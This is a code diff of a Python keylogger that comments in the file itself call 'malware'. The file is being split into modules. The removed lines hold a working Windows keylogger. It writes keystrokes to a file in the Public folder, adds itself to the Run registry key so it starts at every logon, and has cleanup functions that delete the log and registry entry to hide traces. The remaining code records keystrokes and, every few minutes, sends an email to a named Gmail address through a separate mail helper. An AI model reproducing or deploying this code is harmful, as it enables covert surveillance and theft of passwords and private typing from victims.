@@ -1,97 +1,10 @@
-from pynput.keyboard import Key, Listener
 from pynput import keyboard
-import logging
-import time
-from datetime import datetime
-import winreg
-import sys
-import os
-import smtplib
-from email.mime.text import MIMEText
 from mail import send_email
-
-#Buffer to hold the keystrokes before logging
-text = ""
-
-# Track the last time the buffer was logged
-lastLogTime = time.time()
-
-#log text path
-logPath=r"C:\Users\Public\Keylogs.txt"
-
-# setting up the logger to write the keylogs.txt 
-logging.basicConfig(filename=(text + logPath),level=logging.DEBUG, format='%(message)s')
-
-# function to delete the keylog file
-def delete_keylog_file():
-    for handler in logging.root.handlers[:]:
-        handler.close()
-        logging.root.removeHandler(handler)
-    if os.path.exists(logPath):
-        os.remove(logPath)
-        print("\nFile deleted successfully\n")
-
-# function to clean up the things we have done 
-def cleanup():
-    remove_from_startup()
-    delete_keylog_file()
-    print("\nCleaned up the traces :)\n")
-
-# Function to remove the path from the registry
-def remove_from_startup():
-    """Remove script from Windows startup"""
-    try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE
-        )
-        
-        winreg.DeleteValue(key, "keylogger")
-        winreg.CloseKey(key)
-        print("Successfully removed from startup!")
-        return True
-        
-    except Exception as e:
-        print(f"Failed to remove from startup: {e}")
-        return False
-
-# function to add the malware to the windows registry
-def add_to_startup():
-    """Add current script to Windows startup via registry"""
-    try:
-        # Get the path to the current script
-        script_path = os.path.abspath(sys.argv[0])
-        
-        # Create the command to run (python + script path)
-        python_path = sys.executable
-        startup_command = f'"{python_path}" "{script_path}"'
-        
-        # Open registry key for startup programs
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE
-        )
-        
-        # Add entry 
-        winreg.SetValueEx(
-            key,
-            "keylogger",  # Name that appears in startup
-            0,
-            winreg.REG_SZ,
-            startup_command
-        )
-        
-        winreg.CloseKey(key)
-        print("Successfully added to startup!")
-        return True
-        
-    except Exception as e:
-        print(f"Failed to add to startup: {e}")
-        return False
+from datetime import datetime
+from cleanup import cleanup
+from settingUp import text,lastLogTime
+import time
+import logging
 
 # List (or better: set) of special keys you want to log
 special_keys = {
@@ -154,7 +67,7 @@ def on_press(key):
         text += str(key).strip("'")
 
     print(text)
-    # Do the following things every 5 minutes(300 seconds)
+    # Do the following things every 5 minutes(300 seconds) or 3min (180 seconds)
     if time.time() -lastLogTime > 180 :
         # log the data so far collected
         logging.info(str(text))
@@ -162,6 +75,9 @@ def on_press(key):
         # check if the data have the following word it is there only for testing purpose
         #  in real malware we don't need this part if the "quit" word is there in the data 
         # we will do the cleaning process
+        # uncomment the following part so that it will send email when it is mid-night for 
+        # testing purpose only I am sending mail per 3/5 min 
+
         # if "quit" in text: 
         #     cleanup()
         #     return False
@@ -169,6 +85,7 @@ def on_press(key):
         # text = ""
         # lastLogTime = time.time()
 
+    
     # now = datetime.now()
     # if now.hour == 0 and now.minute == 0 :
         reciever = "bidya.gca@gmail.com"
@@ -176,16 +93,10 @@ def on_press(key):
         body = f"Todays date and time: {datetime.now()}"
         send_email(reciever,sub,body)
 
+    # When you uncomment the previous parts comment the rest of the part from here
         if "quit" in text: 
             cleanup()
             return False
         
         text = ""
         lastLogTime = time.time()
-
-
-
-if __name__ == "__main__":
-    add_to_startup()
-    with Listener(on_press = on_press) as listener:
-        listener.join()
